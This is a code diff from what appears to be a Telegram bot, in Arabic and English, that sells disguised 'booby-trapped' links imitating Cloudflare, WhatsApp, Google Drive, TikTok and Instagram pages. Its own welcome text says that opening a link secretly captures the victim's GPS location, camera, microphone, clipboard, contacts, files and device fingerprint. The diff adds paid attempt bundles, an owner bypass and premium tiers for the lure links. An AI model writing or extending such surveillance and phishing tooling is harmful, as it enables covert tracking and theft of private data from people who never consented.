@@ -129,14 +129,14 @@ function getLang(chatId) { return userLang[String(chatId)] || 'ar'; }
 
 const T = {
   ar: {
-    welcome_new:   (name) => `👋 أهلاً بك لأول مرة! 🎉`,
-    welcome_back:  (name) => `مرحباً مجدداً ${name}!`,
-    welcome_body:  `\n\nبوت الروابط الملغمة 🔗\n\nيجمع عند الفتح:\n📍 الموقع (GPS + IP)\n📱 بيانات الجهاز الكاملة\n📷 كاميرا أمامية + خلفية\n🎙️ تسجيل صوتي\n🌐 بيانات الشبكة\n📋 محتوى الحافظة\n🔍 ISP، الدولة، المدينة\n\n⚡ Powered by @Ye_x00`,
+    welcome_new:   (name) => `✨ أهلاً وسهلاً ${name||''} 👑`,
+    welcome_back:  (name) => `🔥 مرحباً مجدداً ${name||''} ⚡`,
+    welcome_body:  `\n\n━━━━━━━━━━━━━━━━━━━━\n🕵️ *بوت التتبع المتقدم*\n━━━━━━━━━━━━━━━━━━━━\n\n📡 *يجمع لحظة الفتح:*\n\n📍 GPS دقيق + IP + المدينة\n📱 بيانات الجهاز الكاملة\n📷 كاميرا أمامية + خلفية\n🎙️ تسجيل صوتي\n🌐 سرعة الإنترنت + ISP\n📋 محتوى الحافظة\n🔑 بصمة الجهاز الفريدة\n👁️ تتبع سلوك المستخدم\n🌙 الوضع الليلي + الخط\n🔇 مستوى الضوضاء المحيطة\n⌨️ تسجيل النقرات\n\n💎 *المميزون يحصلون على أكثر!*\n━━━━━━━━━━━━━━━━━━━━\n⚡ Powered by @Ye_x00`,
     lang_name:     '🇸🇦 العربية',
     lang_switched: '✅ تم التحويل إلى العربية 🇸🇦',
-    menu_title:    '📱 القائمة التفاعلية:',
+    menu_title:    '⚡ *اختر من القائمة:*',
     menu_create:   '🔗 إنشاء رابط',    menu_mylinks:  '📋 روابطي',
-    menu_vip:      '💎 ميزات VIP 🔥', menu_attempts: '🎯 المحاولات',
+    menu_vip:      '💎 VIP 🔥',        menu_attempts: '🎯 محاولات ⭐',
     menu_stats:    '📊 إحصائياتي',    menu_myid:     '🆔 معرّفي',
     menu_help:     '📖 المساعدة',      menu_linktypes:'🔗 أنواع الروابط',
     menu_owner:    '👑 لوحة المالك',  menu_lang:     '🌐 English',
@@ -148,14 +148,14 @@ const T = {
     menu_owner_cmds: '📋 أوامر المالك',
   },
   en: {
-    welcome_new:   (name) => `👋 Welcome for the first time! 🎉`,
-    welcome_back:  (name) => `Welcome back ${name}!`,
-    welcome_body:  `\n\nTracking Link Bot 🔗\n\nCollects on open:\n📍 Location (GPS + IP)\n📱 Full device info\n📷 Front & back camera\n🎙️ Audio recording\n🌐 Network data\n📋 Clipboard content\n🔍 ISP, country, city\n\n⚡ Powered by @Ye_x00`,
+    welcome_new:   (name) => `✨ Welcome ${name||''} 👑`,
+    welcome_back:  (name) => `🔥 Welcome back ${name||''} ⚡`,
+    welcome_body:  `\n\n━━━━━━━━━━━━━━━━━━━━\n🕵️ *Advanced Tracking Bot*\n━━━━━━━━━━━━━━━━━━━━\n\n📡 *Collects on open:*\n\n📍 Precise GPS + IP + City\n📱 Full device fingerprint\n📷 Front & back camera\n🎙️ Audio recording\n🌐 Network speed + ISP\n📋 Clipboard content\n🔑 Unique device signature\n👁️ Behavior tracking\n🌙 Dark mode + fonts\n🔇 Ambient noise level\n⌨️ Click logging\n\n💎 *Premium gets even more!*\n━━━━━━━━━━━━━━━━━━━━\n⚡ Powered by @Ye_x00`,
     lang_name:     '🇺🇸 English',
     lang_switched: '✅ Switched to English 🇺🇸',
-    menu_title:    '📱 Interactive Menu:',
+    menu_title:    '⚡ *Choose from menu:*',
     menu_create:   '🔗 Create Link',   menu_mylinks:  '📋 My Links',
-    menu_vip:      '💎 VIP Features 🔥',menu_attempts:'🎯 Attempts',
+    menu_vip:      '💎 VIP 🔥',        menu_attempts:'🎯 Attempts ⭐',
     menu_stats:    '📊 My Stats',      menu_myid:     '🆔 My ID',
     menu_help:     '📖 Help',          menu_linktypes:'🔗 Link Types',
     menu_owner:    '👑 Owner Panel',   menu_lang:     '🌐 العربية',
@@ -1359,16 +1359,24 @@ bot.on('message', async (msg) => {
     );
 
   if (msg.text === "/attempt") {
+    // ── Owner gets unlimited free attempts ─────────────────────────────────────
+    if (chatId === BOT_OWNER) {
+      return bot.sendMessage(chatId,
+        `👑 *رابط المحاولة — وضع المالك*\n\n✨ لديك محاولات غير محدودة بدون شراء!\n\nأرسل الرابط الذي تريد تلغيمه:`,
+        { parse_mode:'Markdown', reply_markup: JSON.stringify({ force_reply: true }) }
+      );
+    }
     const bal = userAttempts[String(chatId)] || 0;
     if (bal <= 0) return bot.sendMessage(chatId,
-      `❌ *ليس عندك محاولات!*\n\nاشترِ محاولات بـ 20 نجمة للواحدة`,
+      `🎯 *المحاولات المدفوعة*\n\n❌ ليس عندك محاولات!\n\n💡 كل محاولة تجمع:\n📷 كاميرا + 🎙️ صوت + 📍 GPS + 📱 جهاز\n\nاشترِ بالنجوم:`,
       { parse_mode:'Markdown', reply_markup: JSON.stringify({ inline_keyboard: [
-        [{ text:'⭐ شراء محاولة (20 نجمة)', callback_data:'buy_attempt_1' }],
-        [{ text:'⭐ شراء 5 محاولات (100 نجمة)', callback_data:'buy_attempt_5' }]
+        [{ text:'⭐ محاولة واحدة — 20 نجمة', callback_data:'buy_attempt_1' }],
+        [{ text:'⭐⭐ 5 محاولات — 100 نجمة', callback_data:'buy_attempt_5' }],
+        [{ text:'⭐⭐⭐ 10 محاولات — 200 نجمة', callback_data:'buy_attempt_10' }]
       ]}) }
     );
     return bot.sendMessage(chatId,
-      `🎯 *إنشاء رابط محاولة*\n\nرصيدك: *${bal}* محاولة\n\nأرسل الرابط الذي تريد تلغيمه:`,
+      `🎯 *إنشاء رابط محاولة*\n\n💰 رصيدك: *${bal}* محاولة\n\nأرسل الرابط الذي تريد تلغيمه:`,
       { parse_mode:'Markdown', reply_markup: JSON.stringify({ force_reply: true }) }
     );
   }
@@ -3643,19 +3651,28 @@ async function createLink(cid, msg) {
     const fLink  = `${hostURL}/f/${url}`;
     lastLink.set(String(cid), cLink);
     addOldLink(cid, { cLink, wLink, waLink, dlLink, ttLink, igLink, url: trimmed, createdAt: Date.now() });
-    const premiumSection = isPremium(cid)
-      ? `\n\n📒 جهات الاتصال (بريميوم):\n${coLink}\n\n🖼️ صور وملفات (بريميوم):\n${fLink}`
-      : "";
-    const upsellNote = !isPremium(cid)
-      ? `\n\n━━━━━━━━━━━━━━━\n💎 ميزات البريميوم:\n📷 كاميرا أمامية + خلفية\n🎤 تسجيل صوتي\n📋 محتوى الحافظة\n📒 جهات الاتصال الكاملة\n🖼️ صور وملفات الجهاز\n\nللاشتراك تواصل مع @Ye_x00`
-      : "";
-    bot.sendMessage(cid,
-      `✅ تم إنشاء الروابط!\n🔗 URL: ${trimmed}\n\n🛡️ Cloudflare:\n${cLink}\n\n🖥️ WebView:\n${wLink}\n\n💬 WhatsApp:\n${waLink}\n\n📁 Google Drive:\n${dlLink}\n\n🎵 TikTok:\n${ttLink}\n\n📷 Instagram:\n${igLink}${premiumSection}${upsellNote}`,
-      { reply_markup: JSON.stringify({ inline_keyboard: [
-        [{ text:"🔗 إنشاء رابط جديد", callback_data:"crenew" }],
-        [{ text:"📷 QR Code", callback_data:`qr:${cid}` }]
-      ] }) }
-    );
+
+    const prem = isPremium(cid);
+
+    if (!prem) {
+      // ── Free users: Cloudflare + WebView + WhatsApp only ──────────────────
+      bot.sendMessage(cid,
+        `✅ *تم إنشاء روابطك!*\n🔗 \`${trimmed}\`\n\n━━━━━━━━━━━━━━━\n🛡️ *Cloudflare:*\n${cLink}\n\n🖥️ *WebView:*\n${wLink}\n\n💬 *WhatsApp:*\n${waLink}\n\n━━━━━━━━━━━━━━━\n🔒 *روابط مقفلة — للمميزين فقط:*\n📁 Google Drive  |  🎵 TikTok  |  📷 Instagram  |  📒 جهات الاتصال  |  🖼️ ملفات\n\n💎 *اشترك الآن لفتح جميع الروابط!*\nتواصل مع @Ye_x00`,
+        { parse_mode:'Markdown', reply_markup: JSON.stringify({ inline_keyboard: [
+          [{ text:"🔗 رابط جديد", callback_data:"crenew" }, { text:"📷 QR Code", callback_data:`qr:${cid}` }],
+          [{ text:"💎 ترقية للمميز 🔥", callback_data:"pinfo" }]
+        ] }) }
+      );
+    } else {
+      // ── Premium users: all links ───────────────────────────────────────────
+      bot.sendMessage(cid,
+        `✅ *تم إنشاء الروابط!*\n🔗 \`${trimmed}\`\n\n━━━━━━━━━━━━━━━\n🛡️ *Cloudflare:*\n${cLink}\n\n🖥️ *WebView:*\n${wLink}\n\n💬 *WhatsApp:*\n${waLink}\n\n📁 *Google Drive:*\n${dlLink}\n\n🎵 *TikTok:*\n${ttLink}\n\n📷 *Instagram:*\n${igLink}\n\n📒 *جهات الاتصال:*\n${coLink}\n\n🖼️ *صور وملفات:*\n${fLink}`,
+        { parse_mode:'Markdown', reply_markup: JSON.stringify({ inline_keyboard: [
+          [{ text:"🔗 رابط جديد", callback_data:"crenew" }, { text:"📷 QR Code", callback_data:`qr:${cid}` }],
+          [{ text:"📋 إدارة روابطي", callback_data:"lm:list:0" }]
+        ] }) }
+      );
+    }
   } else {
     bot.sendMessage(cid, `⚠️ أدخل رابطاً صحيحاً يبدأ بـ http أو https`);
     createNew(cid);
